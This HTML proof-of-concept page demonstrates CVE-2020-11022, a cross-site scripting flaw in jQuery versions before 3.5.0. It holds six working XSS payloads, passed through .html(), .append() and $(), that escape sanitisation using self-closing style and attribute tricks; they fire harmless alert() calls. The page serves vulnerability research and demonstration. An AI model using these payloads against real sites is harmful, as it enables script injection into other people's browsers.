<!--
    CVE Sandbox :: jQuery :: CVE-2020-11022
    Version: jQuery >= 1.5.1 < 3.5.0
    POC Author: https://twitter.com/therceman
    Credits: https://twitter.com/kinugawamasato
-->

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

<!-- ---------------------- POC 1 (version: >= 1.5.1 < 3.5.0) ---------------------------------
    XSS payload is injected into the .html(), .append(), $() using self-closing <style /> tag
    Tag <style /> is transformed to <style></style>, leading to closure of first <style> tag.
------------------------------------------------------------------------------------------- -->
<div id="cont"></div>

<script>
    <!-- Only payload with <img> tag can be used for all examples  -->
    $('#cont').html('<style><style /><img src=x onerror=alert(1)>');
    $('#cont').append('<style><style /><img src=x onerror=alert(2)>');
    $('<style><style /><img src=x onerror=alert(3)> ');
</script>

<!-- ---------------------- POC 2 (version: >= 3.0.0 < 3.5.0) ---------------------------------
XSS payload is injected into the .html(), .append(), $() using self-closing tag in attrs
<x" title="/> is treated as self-closing tag, leading to XSS because of <img> tag break out
------------------------------------------------------------------------------------------- -->
<div id="cont2"></div>

<script>
    $('#cont2').html('<img alt="<x" title="/><svg onload=alert(4)>">');
    $('#cont2').append('<img alt="<x" title="/><img src=x onerror=alert(5)>">');
    <!-- Only payload with <img> tag can be used for example below -->
    $('<img alt="<x" title="/><img src=x onerror=alert(6)>">');
</script>